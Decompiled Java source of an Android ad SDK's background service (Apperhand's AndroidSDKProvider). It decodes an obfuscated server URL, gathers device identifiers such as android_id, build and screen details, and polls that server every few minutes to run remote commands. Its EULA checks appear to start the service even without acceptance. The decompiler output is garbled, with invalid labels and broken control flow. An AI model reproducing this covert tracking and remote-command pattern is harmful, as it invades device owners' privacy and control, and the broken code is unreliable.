package com.apperhand.device.android;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.Settings.Secure;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import com.apperhand.common.dto.ApplicationDetails;
import com.apperhand.common.dto.Command;
import com.apperhand.common.dto.Command.Commands;
import com.apperhand.common.dto.EULAAcceptDetails;
import com.apperhand.device.a.d.c.a;
import java.io.Serializable;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class AndroidSDKProvider extends IntentService
  implements com.apperhand.device.a.a
{
  private static a m;
  private String a;
  private String b;
  private String c;
  private String d;
  private com.apperhand.device.a.d.c e;
  private com.apperhand.device.a.c.a f;
  private com.apperhand.device.android.a.a g;
  private com.apperhand.device.android.a.b h;
  private com.apperhand.device.android.a.e i;
  private com.apperhand.device.android.a.f j;
  private com.apperhand.device.android.a.d k;
  private com.apperhand.device.android.a.c l;

  public AndroidSDKProvider()
  {
    super("AndroidSDKProvider");
  }

  static void a(Context paramContext, int paramInt, Bundle paramBundle)
  {
    if (Build.VERSION.SDK_INT < 7);
    while (true)
    {
      return;
      String str1 = com.apperhand.device.android.c.f.a(paramContext, "startapp_devid");
      String str2 = com.apperhand.device.android.c.f.a(paramContext, "startapp_appid");
      if ((str1 == null) || (str2 == null) || (paramContext.getSharedPreferences("com.apperhand.global", 0).getBoolean("TERMINATE", false)))
        continue;
      Intent localIntent = new Intent(paramContext, AndroidSDKProvider.class);
      if (paramBundle != null)
        localIntent.putExtras(paramBundle);
      String str3 = new String(com.apperhand.device.a.d.b.a(com.apperhand.device.a.d.a.a("CRoQAlVGS1keGVoEHgRLEBoOGRdLEUE+agQtJzsiJj8tABJOHhYdGwYHQQU=", 0), null));
      localIntent.putExtra("APPLICATION_ID", str2);
      localIntent.putExtra("DEVELOPER_ID", str1);
      localIntent.putExtra("M_SERVER_URL", str3);
      localIntent.putExtra("FIRST_RUN", Boolean.TRUE);
      localIntent.putExtra("USER_AGENT", new WebView(paramContext).getSettings().getUserAgentString());
      localIntent.putExtra("SERVICE_MODE", paramInt);
      paramContext.startService(localIntent);
    }
  }

  public static void initSDK(Context paramContext)
  {
    initSDK(paramContext, true);
  }

  public static void initSDK(Context paramContext, boolean paramBoolean)
  {
    if (!(paramBoolean))
    {
      a(paramContext, 1, null);
      label10: return;
    }
    a locala = new a(paramContext);
    m = locala;
    if (locala.a.getSharedPreferences("com.apperhand.global", 0).getBoolean("ACCEPTED_EULA", false));
    for (int i2 = 1; ; i2 = 0)
    {
      label48: if (i2 != 0);
      a(paramContext, 1, null);
      break label10:
      String str1 = locala.a.getSharedPreferences("com.apperhand.global", 0).getString("NewEulaTemplate", null);
      if ((str1 != null) && (str1.toLowerCase().startsWith("empty")));
      for (int i1 = 1; i1 != 0; i1 = 0)
      {
        SharedPreferences localSharedPreferences = locala.a.getSharedPreferences("com.apperhand.global", 0);
        String str2 = localSharedPreferences.getString("NewEulaChain", null);
        String str3 = localSharedPreferences.getString("NewStep", null);
        long l1 = localSharedPreferences.getLong("EulaCounter", 0L);
        long l2 = localSharedPreferences.getLong("EulaGlobalCounter", 0L);
        Bundle localBundle = new Bundle();
        EULAAcceptDetails localEULAAcceptDetails = new EULAAcceptDetails();
        localEULAAcceptDetails.setButton(null);
        localEULAAcceptDetails.setTemplate("empty");
        localEULAAcceptDetails.setAccepted(false);
        if (str2 == null)
          str2 = "default";
        localEULAAcceptDetails.setChain(str2);
        localEULAAcceptDetails.setStep(str3);
        long l3 = l2 + 1L;
        SharedPreferences.Editor localEditor = localSharedPreferences.edit();
        localEditor.putLong("EulaGlobalCounter", l3);
        localEditor.commit();
        localEULAAcceptDetails.setCounter(l1);
        localEULAAcceptDetails.setGlobalCounter(l3);
        localBundle.putSerializable("eulaAcceptDetails", localEULAAcceptDetails);
        a(locala.a, 3, localBundle);
        i2 = 0;
        break label48:
      }
      Intent localIntent = new Intent(locala.a, EULAActivity.class);
      if (locala.a instanceof Service)
        localIntent.setFlags(335544320);
      locala.a.startActivity(localIntent);
    }
  }

  public static String searchURL(String paramString)
  {
    return searchURL(paramString, SearchCategory.WEB);
  }

  public static String searchURL(String paramString, SearchCategory paramSearchCategory)
  {
    String str1 = com.apperhand.device.android.c.a.a().a("SEARCH_URL", "http://www.searchmobileonline.com/{$CATEGORY$}?sourceid=7&q={$QUERY$}");
    String str2;
    switch (2.a[paramSearchCategory.ordinal()])
    {
    default:
      str2 = str1.replace("{$CATEGORY$}", "");
      label59: if (paramString == null)
        break label121;
    case 1:
    case 2:
    case 3:
    }
    for (String str3 = str2.replace("{$QUERY$}", URLEncoder.encode(paramString)); ; str3 = str2.replace("{$QUERY$}", ""))
    {
      return str3;
      str2 = str1.replace("{$CATEGORY$}", "");
      break label59:
      str2 = str1.replace("{$CATEGORY$}", "simages");
      break label59:
      str2 = str1.replace("{$CATEGORY$}", "svideos");
      label121: break label59:
    }
  }

  public final com.apperhand.device.a.d.c a()
  {
    return this.e;
  }

  public final com.apperhand.device.a.c.a b()
  {
    return this.f;
  }

  public final com.apperhand.device.a.a.a c()
  {
    return this.g;
  }

  public final com.apperhand.device.a.a.b d()
  {
    return this.h;
  }

  public final com.apperhand.device.a.a.e e()
  {
    return this.i;
  }

  public final com.apperhand.device.a.a.f f()
  {
    return this.j;
  }

  public final com.apperhand.device.a.a.d g()
  {
    return this.k;
  }

  public final com.apperhand.device.a.a.c h()
  {
    return this.l;
  }

  public final com.apperhand.device.a.d.d i()
  {
    return com.apperhand.device.android.c.a.a();
  }

  public final ApplicationDetails j()
  {
    ApplicationDetails localApplicationDetails = new ApplicationDetails();
    localApplicationDetails.setApplicationId(this.b);
    localApplicationDetails.setDeveloperId(this.c);
    localApplicationDetails.setUserAgent(this.d);
    localApplicationDetails.setDeviceId(com.apperhand.device.android.c.f.a(this));
    localApplicationDetails.setLocale(Locale.getDefault());
    localApplicationDetails.setProtocolVersion("1.0.17");
    com.apperhand.common.dto.DisplayMetrics localDisplayMetrics = new com.apperhand.common.dto.DisplayMetrics();
    android.util.DisplayMetrics localDisplayMetrics1 = super.getResources().getDisplayMetrics();
    localDisplayMetrics.density = localDisplayMetrics1.density;
    localDisplayMetrics.densityDpi = localDisplayMetrics1.densityDpi;
    localDisplayMetrics.heightPixels = localDisplayMetrics1.heightPixels;
    localDisplayMetrics.scaledDensity = localDisplayMetrics1.scaledDensity;
    localDisplayMetrics.widthPixels = localDisplayMetrics1.widthPixels;
    localDisplayMetrics.xdpi = localDisplayMetrics1.xdpi;
    localDisplayMetrics.ydpi = localDisplayMetrics1.ydpi;
    localApplicationDetails.setDisplayMetrics(localDisplayMetrics);
    com.apperhand.common.dto.Build localBuild = new com.apperhand.common.dto.Build();
    localBuild.setBrand(android.os.Build.BRAND);
    localBuild.setDevice(android.os.Build.DEVICE);
    localBuild.setManufacturer(android.os.Build.MANUFACTURER);
    localBuild.setModel(android.os.Build.MODEL);
    localBuild.setVersionRelease(Build.VERSION.RELEASE);
    localBuild.setVersionSDKInt(Build.VERSION.SDK_INT);
    localBuild.setOs("Android");
    localApplicationDetails.setBuild(localBuild);
    localApplicationDetails.setPackageId(this.a);
    localApplicationDetails.setAndroidId(Settings.Secure.getString(getApplicationContext().getContentResolver(), "android_id"));
    return localApplicationDetails;
  }

  public final String k()
  {
    return this.a;
  }

  public final String l()
  {
    return "1.0.17";
  }

  public final String m()
  {
    return this.d;
  }

  public void onCreate()
  {
    super.onCreate();
    Log.i("AND.Provider", "onCreate");
    setIntentRedelivery(false);
  }

  protected void onHandleIntent(Intent paramIntent)
  {
    Bundle localBundle = paramIntent.getExtras();
    int i1 = localBundle.getInt("SERVICE_MODE");
    this.a = getApplicationContext().getPackageName();
    String str = localBundle.getString("M_SERVER_URL");
    boolean bool = localBundle.getBoolean("FIRST_RUN");
    this.b = localBundle.getString("APPLICATION_ID");
    this.c = localBundle.getString("DEVELOPER_ID");
    this.d = localBundle.getString("USER_AGENT");
    this.e = new com.apperhand.device.android.c.c();
    this.g = new com.apperhand.device.android.a.a(this);
    this.h = new com.apperhand.device.android.a.b(getContentResolver());
    this.i = new com.apperhand.device.android.a.e(this);
    this.j = new com.apperhand.device.android.a.f(this);
    this.k = new com.apperhand.device.android.a.d(this);
    this.l = new com.apperhand.device.android.a.c(this);
    com.apperhand.device.android.c.a.a().a(this);
    1 local1 = new com.apperhand.device.a.b(this, bool, str)
    {
      private void a(PendingIntent paramPendingIntent, long paramLong)
      {
        SharedPreferences.Editor localEditor = AndroidSDKProvider.this.getSharedPreferences("com.apperhand.global", 0).edit();
        localEditor.putLong("NEXT_RUN", System.currentTimeMillis() + paramLong * 1000L);
        localEditor.putLong("INTERVAL", paramLong);
        localEditor.commit();
        long l = SystemClock.elapsedRealtime();
        ((AlarmManager)AndroidSDKProvider.this.getSystemService("alarm")).set(2, l + paramLong * 1000L, paramPendingIntent);
      }

      public final void a()
      {
        Intent localIntent = new Intent(AndroidSDKProvider.this.getApplicationContext(), AndroidSDKProvider.class);
        localIntent.putExtra("APPLICATION_ID", AndroidSDKProvider.a(AndroidSDKProvider.this));
        localIntent.putExtra("DEVELOPER_ID", AndroidSDKProvider.b(AndroidSDKProvider.this));
        localIntent.putExtra("M_SERVER_URL", this.a);
        localIntent.putExtra("FIRST_RUN", Boolean.FALSE);
        localIntent.putExtra("USER_AGENT", AndroidSDKProvider.c(AndroidSDKProvider.this));
        localIntent.putExtra("SERVICE_MODE", 1);
        PendingIntent localPendingIntent = PendingIntent.getService(AndroidSDKProvider.this, 0, localIntent, 0);
        a(localPendingIntent, 300L);
        AndroidSDKProvider.this.a().a(c.a.b, com.apperhand.device.a.b.c, "Apperhand service was started successfully");
        super.a();
        AndroidSDKProvider.this.a().a(c.a.b, com.apperhand.device.a.b.c, "After executing commands");
        com.apperhand.device.android.c.a.a().b(AndroidSDKProvider.this);
        if (!(h()));
        while (true)
        {
          return;
          a(localPendingIntent, e());
          AndroidSDKProvider.this.a().a(c.a.b, com.apperhand.device.a.b.c, "Next command is on [" + e() + "] seconds");
        }
      }

      protected final void a(long paramLong)
      {
        SharedPreferences.Editor localEditor = AndroidSDKProvider.this.getSharedPreferences("com.apperhand.global", 0).edit();
        localEditor.putLong("LAST_INTERVAL", paramLong);
        localEditor.commit();
      }

      protected final void a(String paramString)
      {
        SharedPreferences.Editor localEditor = AndroidSDKProvider.this.getSharedPreferences("com.apperhand.global", 0).edit();
        localEditor.putString("ABTEST_STR", paramString);
        localEditor.commit();
      }

      protected final String b()
      {
        return AndroidSDKProvider.this.getSharedPreferences("com.apperhand.global", 0).getString("ABTEST_STR", null);
      }

      protected final long c()
      {
        return AndroidSDKProvider.this.getSharedPreferences("com.apperhand.global", 0).getLong("LAST_INTERVAL", -1L);
      }

      protected final void d()
      {
        SharedPreferences localSharedPreferences = AndroidSDKProvider.this.getSharedPreferences("com.apperhand.global", 0);
        String str;
        if (localSharedPreferences.getString("ENC_DEVICE_ID", null) == null)
        {
          str = localSharedPreferences.getString("ENC_DUMMY_ID", null);
          if (str != null)
            break label46;
          Log.v("AND.Utils", "Device id is missing");
        }
        while (true)
        {
          return;
          label46: SharedPreferences.Editor localEditor = localSharedPreferences.edit();
          localEditor.putString("ENC_DEVICE_ID", str);
          localEditor.remove("ENC_DUMMY_ID");
          localEditor.commit();
        }
      }
    };
    this.f = new com.apperhand.device.android.b.d(this, this, local1, str);
    if (i1 == 2)
      local1.a(new Command(Command.Commands.EULA));
    while (true)
    {
      return;
      if (i1 == 3)
      {
        Serializable localSerializable = localBundle.getSerializable("eulaAcceptDetails");
        Command localCommand = new Command(Command.Commands.EULA);
        HashMap localHashMap = new HashMap(1);
        localHashMap.put("details", localSerializable);
        local1.a(localCommand, localHashMap);
      }
      if (bool)
      {
        SharedPreferences localSharedPreferences = getSharedPreferences("com.apperhand.global", 0);
        Long localLong1 = Long.valueOf(System.currentTimeMillis());
        Long localLong2 = Long.valueOf(localSharedPreferences.getLong("NEXT_RUN", localLong1.longValue()));
        if (localLong1.longValue() < localLong2.longValue())
          continue;
      }
      local1.a();
    }
  }

  public static enum SearchCategory
  {
    static
    {
      IMAGES = new SearchCategory("IMAGES", 1);
      VIDEO = new SearchCategory("VIDEO", 2);
      SearchCategory[] arrayOfSearchCategory = new SearchCategory[3];
      arrayOfSearchCategory[0] = WEB;
      arrayOfSearchCategory[1] = IMAGES;
      arrayOfSearchCategory[2] = VIDEO;
      $VALUES = arrayOfSearchCategory;
    }
  }
}

/* Location:           C:\Users\changeme\Desktop\browserStartApp\decompilebrowser\
 * Qualified Name:     com.apperhand.device.android.AndroidSDKProvider
 * JD-Core Version:    0.5.3
 */